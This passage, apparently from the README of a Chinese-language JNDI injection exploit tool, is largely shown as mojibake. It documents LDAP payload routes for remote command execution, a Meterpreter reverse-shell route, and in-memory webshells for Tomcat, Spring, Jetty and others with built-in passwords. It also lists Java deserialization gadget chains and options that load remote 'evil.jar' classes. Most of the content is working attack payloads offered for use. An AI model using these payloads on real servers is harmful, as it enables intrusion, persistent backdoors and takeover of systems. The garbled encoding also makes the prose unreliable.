    + åŸç†æ˜¯éå†å½“å‰è¿›ç¨‹ fd ç›®å½•ä¸‹çš„æ‰€æœ‰å’Œ socket ç›¸å…³çš„ fd æ–‡ä»¶ï¼Œå¹¶è¾“å‡ºç»“æœ;
    + ç¼ºé™·ï¼š1. ä¼šå½±å“åŒä¸€æ—¶é—´ç‚¹æ‰€æœ‰è®¿é—®ç½‘ç«™çš„ç”¨æˆ·ï¼ˆä¹Ÿä¼šçœ‹åˆ°è‡ªå®šä¹‰å›æ˜¾çš„ç»“æœï¼‰; 2. åœ¨8æ¬¡å·¦å³æœ‰å¯èƒ½å¯¼è‡´åº”ç”¨å´©æºƒ
  * ```LinuxEcho2```: Linux å‘½ä»¤æ‰§è¡Œå›æ˜¾, åªæ‰§è¡Œäº†id
    + åŸç†ï¼šé€šè¿‡å»¶è¿Ÿç­‰æ–¹æ³•æ¥ç¡®å®šå”¯ä¸€æ­£ç¡®çš„ fd æ–‡ä»¶;
    + ä¸ä¼šå½±å“è®¿é—®ç½‘ç«™çš„å…¶ä»–ç”¨æˆ·ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´åº”ç”¨å´©æºƒ;
  * ```AllEcho```: è‡ªåŠ¨é€‰æ‹©å‘½ä»¤æ‰§è¡Œå›æ˜¾, é€šè¿‡æ·»åŠ è‡ªå®šä¹‰```header``` ```cmd: whoami``` çš„æ–¹å¼ä¼ é€’æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤
  * ```command```ï¼šç”¨äºæ‰§è¡Œå‘½ä»¤ï¼Œå¦‚æœå‘½ä»¤æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ”¯æŒå¯¹å‘½ä»¤è¿›è¡Œ Base64ç¼–ç åä¼ è¾“

+ ç›´æ¥å‘½ä»¤æ‰§è¡Œç¤ºä¾‹ï¼š

```
ldap://127.0.0.1:1389/TomcatBypass/command/Base64/[base64_encoded_cmd]
```

+ Echoç¤ºä¾‹ï¼š

```
jndi:ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho
jndi:ldap://127.0.0.1:1389/Basic/TomcatEcho
```

æ•ˆæœå›¾ï¼š

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230627112538.png)

- æ”¯æŒtomcatBypassè·¯ç”±ç›´æ¥ä¸Šçº¿msfï¼š
- ä½¿ç”¨msfçš„java/meterpreter/reverse_tcpå¼€å¯ç›‘å¬

```
ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/msf/[msf_ip]/[msf_port]
```

---

## 1.1 å†…å­˜é©¬

ä¸¤ç§æ·»åŠ æ–¹å¼ï¼š

- æ”¯æŒå¼•ç”¨è¿œç¨‹ç±»åŠ è½½æ–¹å¼æ‰“å…¥ï¼ˆBasicè·¯ç”±ï¼‰ã€‚
- æ”¯æŒæœ¬åœ°å·¥å‚ç±»åŠ è½½æ–¹å¼æ‰“å…¥ï¼ˆTomcatBypassè·¯ç”±ï¼‰ã€‚

ä½¿ç”¨è¯´æ˜ï¼š
ä¸æŒ‡å®šç±»å‹å°±é»˜è®¤ä¸ºå†°èé©¬ã€‚

- t é€‰æ‹©å†…å­˜é©¬çš„ç±»å‹
  - ä¸æŒ‡å®šç±»å‹å°±é»˜è®¤ä¸ºå†°èé©¬
  - bx: å†°èå†…å­˜é©¬ï¼Œ```key: 3c6e0b8a9c15224a```, ```Refererï¼šhttps://QI4L.cn/```
  - gz: å“¥æ–¯æ‹‰å†…å­˜é©¬ï¼Œ```pass: p@ssw0rd```, ```Refererï¼šhttps://QI4L.cn/```
  - gzraw: å“¥æ–¯æ‹‰ raw ç±»å‹çš„å†…å­˜é©¬, ```pass: p@ssw0rd```, ```Refererï¼šhttps://QI4L.cn/```
  - cmd: cmdå‘½ä»¤å›æ˜¾å†…å­˜é©¬
  - sou5: suo5 éš§é“é©¬
- aï¼šæ˜¯å¦ç»§æ‰¿æ¶æ„ç±» AbstractTranslet
- oï¼šä½¿ç”¨åå°„ç»•è¿‡
- wï¼šWindowsä¸‹ä½¿ç”¨Agentå†™å…¥
- lï¼šLinuxä¸‹ä½¿ç”¨Agentå†™å…¥
- uï¼šå†…å­˜é©¬ç»‘å®šçš„è·¯å¾„,default [/sysinfo]
- pwï¼šå†…å­˜é©¬çš„å¯†ç ,default [p@ssw0rd]
- rï¼šå†…å­˜é©¬ Referer check,default [https://www.baidu.com/]
- hï¼šé€šè¿‡å°†æ–‡ä»¶å†™å…¥$JAVA_HOMEæ¥éšè—å†…å­˜shellï¼Œç›®å‰åªæ”¯æŒ SpringControllerMS
- htï¼šéšè—å†…å­˜å¤–å£³ï¼Œè¾“å…¥1:write /jre/lib/charsets.jar 2:write /jre/classes/

+ å†…å­˜é©¬ä½¿ç”¨ç¤ºä¾‹ï¼š
+ åŠ å‚æ•°

```
jndi:ldap://127.0.0.1:1389/Basic/tomcatfilterjmx/shell/-u path223 -pw 123456 -r tth.cn
```

+ é»˜è®¤åŠ è½½

```
jndi:ldap://127.0.0.1:1389/Basic/tomcatfilterjmx/shell
```

å†…å­˜é©¬è¯´æ˜ï¼š

* ```SpringInterceptor```: å‘ç³»ç»Ÿå†…æ¤å…¥ Spring Interceptor ç±»å‹çš„å†…å­˜é©¬
* ```SpringController```: å‘ç³»ç»Ÿå†…æ¤å…¥ Spring Controller ç±»å‹çš„å†…å­˜é©¬
* ```JettyFilter```: åˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Jetty Filter å‹å†…å­˜é©¬
* ```JettyServlet```: åˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Jetty Servlet å‹å†…å­˜é©¬
* ```JBossFilter```: é€šè¿‡å…¨å±€ä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ JBoss/Wildfly Filter å‹å†…å­˜é©¬
* ```JBossServlet```: é€šè¿‡å…¨å±€ä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ JBoss/Wildfly Servlet å‹å†…å­˜é©¬
* ```resinFilterTh```: é€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡ç³»ç»Ÿå†…æ¤å…¥ Resin Filter å‹å†…å­˜é©¬
* ```resinServletTh```: é€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡ç³»ç»Ÿå†…æ¤å…¥ Resin Servlet å‹å†…å­˜é©¬
* ```WebsphereMemshell```: ç”¨äºæ¤å…¥```Websphereå†…å­˜shell```ï¼Œ æ”¯æŒ```Behinder shell``` ä¸ ```Basic cmd shell```
* ```tomcatFilterJmx```: åˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Filter å‹å†…å­˜é©¬
* ```tomcatFilterTh```: é€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Filter å‹å†…å­˜é©¬
* ```TomcatListenerJmx```: åˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Listener å‹å†…å­˜é©¬
* ```TomcatListenerTh```: é€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Listener å‹å†…å­˜é©¬
* ```TomcatServletJmx```: åˆ©ç”¨ JMX MBeans å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Servlet å‹å†…å­˜é©¬
* ```TomcatServletTh```: é€šè¿‡çº¿ç¨‹ç±»åŠ è½½å™¨è·å–æŒ‡å®šä¸Šä¸‹æ–‡å‘ç³»ç»Ÿå†…æ¤å…¥ Tomcat Servlet å‹å†…å­˜é©¬
* ```WSFilter```: `CMD` å‘½ä»¤å›æ˜¾ WebSocket å†…å­˜é©¬ï¼Œ`cmdå‘½ä»¤å›æ˜¾`
* ```TomcatExecutor``` : Executor å†…å­˜é©¬ï¼Œ`cmdå‘½ä»¤å›æ˜¾`
* ```TomcatUpgrade```: TomcatUpgrade å†…å­˜é©¬ï¼Œ`cmdå‘½ä»¤å›æ˜¾`
* ```Struts2ActionMS```: Action ç±»å‹å†…å­˜é©¬
* ```cmsMSBYNC```: ç»•è¿‡Nginxã€CDNä»£ç†é™åˆ¶çš„ WebSocket é©¬ï¼Œè·¯å¾„`/x`
* ```proxyMSBYNC```: ç»•è¿‡Nginxã€CDNä»£ç†é™åˆ¶çš„ WebSocket é©¬ï¼Œè·¯å¾„`/x`
* ```WsResin```: é€‚é… Resin çš„ WebSocket é©¬ï¼Œè¯·æ±‚å¤´ä¸­`Upgrade: websocket`
* ```MsTSJser```: é€‚é…Tomcatã€Springã€Jettyçš„ WebSocket é©¬ï¼Œè·¯å¾„`/cmd`
* ```MsTSJproxy```: é€‚é…Tomcatã€Springã€Jettyçš„ WebSocket é©¬ï¼Œè·¯å¾„`/proxy`
* ```WsWeblogic```: é€‚é… Weblogic çš„ WebSocket é©¬ï¼Œè·¯å¾„`/path`
* ```WSWebsphereProxy```: é€‚é… Websphere çš„ WebSocket é©¬ï¼Œè·¯å¾„`/path`

---

## 1.2 BeanShell1 ä¸ Clojure åˆ©ç”¨é“¾çš„æ‹“å±•

å¯¹äº `BeanShell1` åŠ `Clojure` è¿™ä¸¤ä¸ªåŸºäºè„šæœ¬è¯­è¨€è§£æçš„æ¼åˆ©ç”¨æ–¹å¼ã€‚

æœ¬é¡¹ç›®ä¸ºè¿™ä¸¤æ¡åˆ©ç”¨é“¾æ‹“å±•äº†é™¤äº† Runtime æ‰§è¡Œå‘½ä»¤ä»¥å¤–çš„å¤šç§åˆ©ç”¨æ–¹å¼ï¼Œå…·ä½“å¦‚ä¸‹ï¼š

`Base64/`åçš„å†…å®¹éœ€è¦base64ç¼–ç 

TS ï¼šThread Sleep - é€šè¿‡ Thread.sleep() çš„æ–¹å¼æ¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½¿ç”¨å‘½ä»¤ï¼šTS-10

```
jndi:ldap://127.0.0.1:1389/Deserialization/Clojure/command/Base64/TS-10
```

RC ï¼šRemote Call - é€šè¿‡ URLClassLoader.loadClass()
æ¥è°ƒç”¨è¿œç¨‹æ¶æ„ç±»å¹¶åˆå§‹åŒ–ï¼Œä½¿ç”¨å‘½ä»¤ï¼šRC-http://xxxx.com/evil.jar#EvilClass

æ¢æˆCSæˆ–è€…MSFç”Ÿæˆçš„JARåŒ…ï¼Œå³å¯å®Œæˆä¸€é”®ä¸Šçº¿ã€‚

```
jndi:ldap://127.0.0.1:1389/Deserialization/Clojure/command/Base64/RC-http://xxxx.com/evil.jar#EvilClass
```

WF ï¼šWrite File - é€šè¿‡ FileOutputStream.write() æ¥å†™å…¥æ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤ï¼šWF-/tmp/shell#123

```
jndi:ldap://127.0.0.1:1389/Deserialization/Clojure/command/Base64/WF-/tmp/shell#123
```

å…¶ä»–ï¼šæ™®é€šå‘½ä»¤æ‰§è¡Œ - é€šè¿‡ ProcessBuilder().start() æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½¿ç”¨å‘½ä»¤ whoami

```
jndi:ldap://127.0.0.1:1389/Deserialization/Clojure/command/Base64/whoami
```

---

## 1.3 C3P04çš„ä½¿ç”¨

* è¿œç¨‹åŠ è½½ Jar åŒ…
  * C3P04 'remoteJar-http://1.1.1.1.com/1.jar'
* å‘æœåŠ¡å™¨å†™å…¥ Jar åŒ…å¹¶åŠ è½½ï¼ˆä¸å‡ºç½‘ï¼‰
  * C3P04 'writeJar-/tmp/evil.jar:./yaml.jar'
  * C3P04 'localJar-./yaml.jar'
* C3P0 äºŒæ¬¡ååºåˆ—åŒ–
  * C3P04 'c3p0Double-/usr/CC6.ser'

```
jndi:ldap://127.0.0.1:1389/Deserialization/C3P04/command/Base64/[base64_encoded_cmd]
```

---

## 1.4 SignedObject äºŒæ¬¡ååºåˆ—åŒ– Gadget

ç”¨æ¥è¿›è¡ŒæŸäº›åœºæ™¯çš„ç»•è¿‡ï¼ˆå¸¸è§å¦‚ TemplatesImpl é»‘åå•ï¼ŒCTF ä¸­å¸¸å‡ºç°çš„ CC æ— æ•°ç»„åŠ é»‘åå•ç­‰ï¼‰

åˆ©ç”¨é“¾éœ€è¦è°ƒç”¨ SignedObject çš„ getObject æ–¹æ³•ï¼Œå› æ­¤éœ€è¦å¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•ã€æˆ–è°ƒç”¨æŒ‡å®šç±» getter æ–¹æ³•çš„è§¦å‘ç‚¹ï¼›

å¤§æ¦‚åŒ…å«å¦‚ä¸‹å‡ ç§å¯ç”¨çš„å¸¸è§è°ƒç”¨é“¾ï¼š

1. InvokerTransformer è°ƒç”¨ä»»æ„æ–¹æ³•ï¼ˆä¾èµ– CCï¼‰
2. BeanComparator è°ƒç”¨ getter æ–¹æ³•ï¼ˆä¾èµ– CBï¼‰
3. BasicPropertyAccessor$BasicGetter è°ƒç”¨ getter æ–¹æ³•(ä¾èµ– Hibernate)
4. ToStringBean è°ƒç”¨å…¨éƒ¨ getter æ–¹æ³•ï¼ˆä¾èµ– Romeï¼‰
5. MethodInvokeTypeProvider åå°„è°ƒç”¨ä»»æ„æ–¹æ³•ï¼ˆä¾èµ– spring-coreï¼‰
6. MemberBox åå°„è°ƒç”¨ä»»æ„æ–¹æ³•ï¼ˆä¾èµ– rhinoï¼‰

* `cc`,`cc4`,`cb`,`hibernate`,`rome`,`rhino`,`spring`

* åˆ©ç”¨æ–¹å¼ï¼š
* SignedObjectPayload -> 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:1:10000' æœ€åä¸¤ä¸ªå‚æ•°æ˜¯ååºåˆ—åŒ–çš„ç±»å‹

```
jndi:ldap://127.0.0.1:1389/Deserialization/SignedObject/command/Base64/CC:commonscollections6:[base64_encoded_cmd]:1::10000)
```

---

## 1.5 Deserializationè·¯ç”±

| Gadget                                      | ä¾èµ–                                                         | ps                   |
| :------------------------------------------ | :----------------------------------------------------------- | -------------------- |
| AspectJWeaver                               | aspectjweaver:1.9.2<br/>commons-collections:3.2.2            |                      |
| AspectJWeaver2                              | org.aspectj:aspectjweaver:1.9.2<br/>commons-collections:commons-collections:3.2.2 |                      |
| BeanShell1                                  | org.beanshell:bsh:2.0b5                                      |                      |
| C3P0                                        | com.mchange:c3p0:0.9.5.2<br/>mchange-commons-java:0.2.11     |                      |
| C3P02                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35 |                      |
| C3P03                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.codehaus.groovy:groovy:2.3.9 |                      |
| C3P04                                       | com.mchange:c3p0:0.9.5.2<br/>com.mchange:mchange-commons-java:0.2.11<br/>org.apache:tomcat:8.5.35<br/>org.yaml:snakeyaml:1.30 |                      |
| C3P092                                      | com.mchange:c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8<br/>com.mchange:mchange-commons-java:0.2.11 |                      |
| Click1                                      | org.apache.click:click-nodeps:2.3.0<br/>javax.servlet:javax.servlet-api:3.1.0 |                      |
| Clojure                                     | org.clojure:clojure:1.8.0                                    |                      |
| CommonsBeanutils1                           | commons-beanutils:commons-beanutils:1.9.2<br/>commons-collections:commons-collections:3.1<br/>commons-logging:commons-logging:1.2 |                      |
| CommonsBeanutils1Jdbc                       |                                                              | é«˜ç‰ˆæœ¬Bypass         |
| CommonsBeanutils2                           | commons-beanutils:commons-beanutils:1.9.2                    | å¯æ‰“shiro            |
| CommonsBeanutils2Jdbc                       |                                                              | é«˜ç‰ˆæœ¬Bypass         |
| CommonsBeanutils2NOCC                       | commons-beanutils:commons-beanutils:1.8.3<br/>commons-logging:commons-logging:1.2 |                      |
| CommonsBeanutils1183NOCC                    | commons-beanutils:commons-beanutils:1.8.3                    |                      |
| CommonsBeanutilsAttrCompare                 | commons-beanutils:commons-beanutils:1.9.2                    |                      |
| CommonsBeanutilsAttrCompare183              | commons-beanutils:commons-beanutils:1.8.3                    |                      |
| CommonsBeanutilsObjectToStringComparator    | ""commons-beanutils:commons-beanutils:1.9.2 org.apache.commons:commons-lang3:3.10"" |                      |
| CommonsBeanutilsObjectToStringComparator183 | ""commons-beanutils:commons-beanutils:1.8.3""                  |                      |
| CommonsBeanutilsPropertySource              | ""commons-beanutils:commons-beanutils:1.9.2 org.apache.logging.log4j:log4j-core:2.17.1"" |                      |
| CommonsBeanutilsPropertySource183           | ""commons-beanutils:commons-beanutils:1.9.2 org.apache.logging.log4j:log4j-core:2.17.1"" |                      |
| CommonsCollections1                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections2                         | org.apache.commons:commons-collections4:4.0                  |                      |
| CommonsCollections3                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections4                         | org.apache.commons:commons-collections4:4.0                  |                      |
| CommonsCollections5                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections6                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections7                         | commons-collections:commons-collections:3.1                  |                      |
| CommonsCollections8                         | org.apache.commons:commons-collections4:4.0                  |                      |
| CommonsCollections9                         | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollections10                        | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollections11                        | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollections12                        | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollectionsK1                        | commons-collections:commons-collections:3.2.1                |                      |
| CommonsCollectionsK2                        | org.apache.commons:commons-collections4:4.0                  |                      |
| CommonsCollectionsK3                        | commons-collections:commons-collections:3.1                  | CC6ç®€åŒ–çš„å†™æ³•        |
| CommonsCollectionsK4                        | org.apache.commons:commons-collections4:4.0                  | CC6ç®€åŒ–çš„å†™æ³•çš„4.0ç‰ˆ |
| CommonsCollectionsK5                        | org.apache.commons:commons-collections4:4.0                  | CC7çš„4.0ç‰ˆ           |
| CommonsCollectionsK6                        | org.apache.commons:commons-collections4:4.0                  | CC11çš„4.0ç‰ˆ          |
| Fastjson1                                   | Fastjosn 1.2.48                                              |                      |
| Fastjson2                                   | Fastjosn 2+                                                  |                      |
| Groovy1                                     | org.codehaus.groovy:groovy:2.3.9                             |                      |
| Hibernate1                                  | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final |                      |
| Hibernate2                                  | org.hibernate:hibernate-core:5.0.7.Final<br/>org.hibernate:hibernate-core:4.3.11.Final |                      |
| Jackson                                     |                                                              |                      |
| JavassistWeld1                              | javassist:javassist:3.12.1.GA<br/>org.jboss.weld:weld-core:1.1.33.Final<br/>javax.interceptor:javax.interceptor-api:3.1<br/>javax.enterprise:cdi-api:1.0-SP1<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final<br/>org.slf4j:slf4j-api:1.7.21 |                      |
| JBossInterceptors1                          | javassist:javassist:3.12.1.GA<br/>org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final<br/>javax.enterprise:cdi-api:1.0-SP1<br/>javax.interceptor:javax.interceptor-api:3.1<br/>org.slf4j:slf4j-api:1.7.21<br/>org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final |                      |
| Jdk7u21                                     | -                                                            |                      |
| Jdk7u21variant                              | -                                                            |                      |
| JRE8u20                                     |                                                              |                      |
| JRE8u20_2                                   |                                                              |                      |
| JRMPClient                                  |                                                              |                      |
| JRMPClient_Activator                        |                                                              |                      |
| JRMPClient_Obj                              |                                                              |                      |
| JRMPListener                                |                                                              |                      |
| JSON1                                       | net.sf.json-lib:json-lib:jar:jdk15:2.4<br/>org.springframework:spring-aop:4.1.4.RELEASE |                      |
| Jython1                                     | org.python:jython-standalone:2.5.2                           |                      |
| MozillaRhino1                               | rhino:js:1.7R2                                               |                      |
| MozillaRhino2                               | rhino:js:1.7R2                                               |                      |
| Myfaces1                                    | -                                                            |                      |
| Myfaces2                                    | -                                                            |                      |
| RenderedImage                               | javax.media:jai-codec-1.1.3                                  |                      |
| ROME                                        | rome:rome:1.0                                                |                      |
| ROME2                                       | rome:rome:1.0<br/>JDK 8+                                     |                      |
| Spring1                                     | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-beans:4.1.4.RELEASE |                      |
| Spring2                                     | org.springframework:spring-core:4.1.4.RELEASE<br/>org.springframework:spring-aop:4.1.4.RELEASE<br/>aopalliance:aopalliance:1.0<br/>commons-logging:commons-logging:1.2 |                      |
| Spring3                                     | org.springframework:spring-tx:5.2.3.RELEASE<br/>org.springframework:spring-context:5.2.3.RELEASE<br/>javax.transaction:javax.transaction-api:1.2 |                      |
| Vaadin1                                     | com.vaadin:vaadin-server:7.7.14<br/>com.vaadin:vaadin-shared:7.7.14 |                      |
| Wicket1                                     | org.apache.wicket:wicket-util:6.23.0<br/>org.slf4j:slf4j-api:1.6.4 |                      |

- aï¼šæ¶æ„ç±»æ˜¯å¦ç»§æ‰¿ AbstractTranslet
- oï¼šä½¿ç”¨åå°„ç»•è¿‡
  ~~- jï¼šä½¿ç”¨ ObjectInputStream/ObjectOutputStream æ¥æ„é€ åºåˆ—åŒ–æµ~~ï¼ˆè¿™ä¸ªæ„é€ çš„æµæœ‰BUGï¼Œè¿˜åœ¨æ€è€ƒä¿®å¤ï¼‰
- éœ€è¦å‚æ•°æ—¶ï¼Œåœ¨å‘½ä»¤åé¢æ·»åŠ ï¼Œ#å‚æ•°

* ä½¿ç”¨ç¤ºä¾‹ï¼š

```
jndi:ldap://127.0.0.1:1389/Deserialization/[GadgetType]/command/Base64/[base64_encoded_cmd]
```

åŠ å‚æ•°

```
jndi:ldap://127.0.0.1:1389/Deserialization/[GadgetType]/command/cmd#-a -o}
```

å½“å‘½ä»¤ä¸­æœ‰`?`æ—¶base64ç¼–ç å‡ºç°`/`å¯¼è‡´å‡ºç°BUGæ—¶ä½¿ç”¨ï¼Œå‘½ä»¤éœ€è¦Base64ç¼–ç ä¸¤æ¬¡ã€‚

```
jndi:ldap://127.0.0.1:1389/Deserialization/[GadgetType]/command/Base64Two/base64_encoded_cmd#-a -o
```

* æ•ˆæœå›¾

![](https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage.png)

---

å¯¹äºGadgetï¼š

- CommonsCollections1
- CommonsCollections5
- CommonsCollections6
- CommonsCollectionsK3
- CommonsCollectionsK4
- CommonsCollections7
- commonscollectionsK5
- CommonsCollections9

* ä½¿ç”¨ `Transformer[]` æ•°ç»„å®ç°

ä¸ºå…¶æ‹“å±•äº†é™¤äº† Runtime æ‰§è¡Œå‘½ä»¤æ„å¤–çš„å¤šç§åˆ©ç”¨æ–¹å¼ï¼Œå…·ä½“å¦‚ä¸‹ï¼š

TS ï¼šThread Sleep - é€šè¿‡ Thread.sleep() çš„æ–¹å¼æ¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½¿ç”¨å‘½ä»¤ï¼šTS-10

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/TS-10
```

RC ï¼šRemote Call - é€šè¿‡ URLClassLoader.loadClass()
æ¥è°ƒç”¨è¿œç¨‹æ¶æ„ç±»å¹¶åˆå§‹åŒ–ï¼Œä½¿ç”¨å‘½ä»¤ï¼šRC-http://xxxx.com/evil.jar#EvilClass

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/RC-http://xxxx.com/evil.jar#EvilClass
```

WF ï¼šWrite File - é€šè¿‡ FileOutputStream.write() æ¥å†™å…¥æ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤ï¼šWF-/tmp/shell#d2hvYW1p

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/WF-/tmp/shell#d2hvYW1p
```

PB ï¼šProcessBuilder é€šè¿‡ ProcessBuilder.start() æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½¿ç”¨å‘½ä»¤ ```PB-lin-d2hvYW1p``` / ```PB-win-d2hvYW1p```
åˆ†åˆ«åœ¨ä¸åŒæ“ä½œç³»ç»Ÿæ‰§è¡Œå‘½ä»¤

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/PB-lin-b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
```

SE ï¼šScriptEngine - é€šè¿‡ ScriptEngineManager.getEngineByName('js').eval() æ¥è§£æ JS ä»£ç è°ƒç”¨ Runtime æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨å‘½ä»¤
SE-d2hvYW1

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/SE-d2hvYW1
```

DL ï¼šDNS LOG - é€šè¿‡ InetAddress.getAllByName() æ¥è§¦å‘ DNS è§£æï¼Œä½¿ç”¨å‘½ä»¤ DL-xxxdnslog.cn

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/DL-xxxdnslog.cn
```

HL ï¼šHTTP LOG - é€šè¿‡ URL.getContent() æ¥è§¦å‘ HTTP LOGï¼Œä½¿ç”¨å‘½ä»¤ HL-http://xxx.com

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/HL-http://xxx.com
```

BC ï¼šBCEL Classloader - é€šè¿‡ ..bcel...ClassLoader.loadClass().newInstance() æ¥åŠ è½½ BCEL ç±»å­—èŠ‚ç ï¼Œä½¿ç”¨å‘½ä»¤ BC-$BCEL$xxx

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/BC-$BCEL$xxx
```

å…¶ä»–ï¼šæ™®é€šå‘½ä»¤æ‰§è¡Œ - é€šè¿‡ Runtime.getRuntime().exec() æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½¿ç”¨å‘½ä»¤ whoami

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections1/command/Base64/whoami
```

## 1.6 å…¶ä»–åˆ©ç”¨é“¾æ‹“å±•

å¯¹äºé™¤äº†ä»¥ä¸Šçš„åˆ©ç”¨é“¾,ä½¿ç”¨çš„æ˜¯ `TemplatesImpl` ç±»æ¥å®ç°ã€‚

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections3/command/Base64/whoami
```

## 1.7 ä»»æ„è‡ªå®šä¹‰ä»£ç 

å¯¹äºä½¿ç”¨äº† `TemplatesImpl` ç±»æ¥å®ç°çš„é“¾å­æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•

å¦‚æœä½ ä¸æƒ³ä½¿ç”¨æœ¬é¡¹ç›®ä¸­æä¾›çš„æ¶æ„é€»è¾‘ï¼Œä¹Ÿä¸æƒ³æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡è‡ªå®šä¹‰ä»£ç çš„å½¢å¼ï¼Œè‡ªå®šä¹‰ä»£ç å°†ä¼šåœ¨ç›®æ ‡æœåŠ¡å™¨é€šè¿‡ `ClassLoader`
è¿›è¡ŒåŠ è½½å¹¶å®ä¾‹åŒ–ã€‚å‘½ä»¤ä½¿ç”¨ `LF#` å¼€å¤´ï¼Œåé¢è·ŸæŒ‡å®šè‡ªå®šä¹‰ç±»å­—èŠ‚ç æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚

ç¤ºä¾‹ï¼š

**class ç±»æ–‡ä»¶ç»å¯¹è·¯å¾„**

```
jndi:ldap://127.0.0.1:1389/Deserialization/CommonsCollections3/command/Base64/LF#/tmp/evil.class-org
```

## 1.8 åˆ©ç”¨é“¾æ¢æµ‹

å‚è€ƒäº† kezibei å¸ˆå‚…çš„ URLDNS é¡¹ç›®ï¼Œå®é™…æƒ…å†µå¯èƒ½æœ‰å¦‚ä¸‹å‡ ç§æƒ…å†µå¯¼è‡´é—®é¢˜ï¼š

+ ååºåˆ—æ—¶é‡åˆ°é»‘åå•ï¼Œå¯èƒ½å¯¼è‡´åé¢çš„ç±»çš„ dnslog å‡ºä¸æ¥ï¼›
+ ååºåˆ—åŒ–æµç¨‹ä¸­ç”±äºç§ç§æƒ…å†µæŠ¥é”™å¯èƒ½å¯¼è‡´å‡ºä¸æ¥ã€‚

å› æ­¤è¿™é‡Œè¿˜æ˜¯æä¾›äº† all/common/æŒ‡å®šç±» ä¸‰ç§æ¢æµ‹æ–¹å¼ï¼š

+ allï¼šæ¢æµ‹å…¨éƒ¨çš„ç±»ï¼›
+ commonï¼šæ¢æµ‹ä¸å¸¸åœ¨é»‘åå•ä¸­çš„ CommonsBeanutils2/C3P0/AspectJWeaver/bsh/winlinuxï¼›
+ æŒ‡å®šç±»ï¼šä½¿ç”¨å¯¹åº”é“¾ä¸­çš„å…³é”®å­— CommonsCollections24:xxxx.dns.log ã€‚

```
jndi:ldap://127.0.0.1:1389/Deserialization/URLDNS/command/Base64/all:xxxxxx.dns.log
```

| DNSLOG å…³é”®å­—                               | å¯¹åº”é“¾                  | å…³é”®ç±»                                                       | å¤‡æ³¨                                                         |
| ------------------------------------------- | ----------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
